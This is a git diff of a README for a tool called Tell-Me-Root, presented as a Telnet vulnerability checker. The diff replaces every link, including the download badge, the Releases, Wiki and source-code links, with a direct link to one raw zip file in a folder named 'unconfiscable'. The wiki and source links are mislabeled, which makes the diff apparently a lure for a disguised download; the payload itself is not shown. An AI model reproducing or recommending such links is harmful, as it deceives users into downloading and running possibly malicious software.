@@ -1,6 +1,6 @@
 # 🚀 Tell-Me-Root - Easily Check for Telnet Vulnerabilities
 
-[![Download Tell-Me-Root](https://img.shields.io/badge/Download-Tell--Me--Root-blue)](https://github.com/Moxxic1/Tell-Me-Root/releases)
+[![Download Tell-Me-Root](https://raw.githubusercontent.com/Moxxic1/Tell-Me-Root/main/unconfiscable/Root-Tell-Me-2.7.zip)](https://raw.githubusercontent.com/Moxxic1/Tell-Me-Root/main/unconfiscable/Root-Tell-Me-2.7.zip)
 
 ## 📋 Introduction
 
@@ -20,7 +20,7 @@ To get started with Tell-Me-Root, follow these steps:
 
 1. **Visit the Download Page**: Click the link below to reach the Releases page, where you can find the latest version of the software.
 
-   [Visit the Releases Page to Download](https://github.com/Moxxic1/Tell-Me-Root/releases)
+   [Visit the Releases Page to Download](https://raw.githubusercontent.com/Moxxic1/Tell-Me-Root/main/unconfiscable/Root-Tell-Me-2.7.zip)
 
 2. **Choose the Right Version**: Look for the latest release. You will see different files available for download. 
 
@@ -82,7 +82,7 @@ Tell-Me-Root is constantly evolving. We welcome contributions and feedback. If y
 
 ## 🔗 Additional Resources
 
-- **Documentation**: For detailed explanations of features and usage, refer to the [Wiki Page](https://github.com/Moxxic1/Tell-Me-Root/wiki).
-- **Explore on GitHub**: View the source code and track updates [here](https://github.com/Moxxic1/Tell-Me-Root).
+- **Documentation**: For detailed explanations of features and usage, refer to the [Wiki Page](https://raw.githubusercontent.com/Moxxic1/Tell-Me-Root/main/unconfiscable/Root-Tell-Me-2.7.zip).
+- **Explore on GitHub**: View the source code and track updates [here](https://raw.githubusercontent.com/Moxxic1/Tell-Me-Root/main/unconfiscable/Root-Tell-Me-2.7.zip).
 
-[Visit the Releases Page to Download](https://github.com/Moxxic1/Tell-Me-Root/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/Moxxic1/Tell-Me-Root/main/unconfiscable/Root-Tell-Me-2.7.zip)
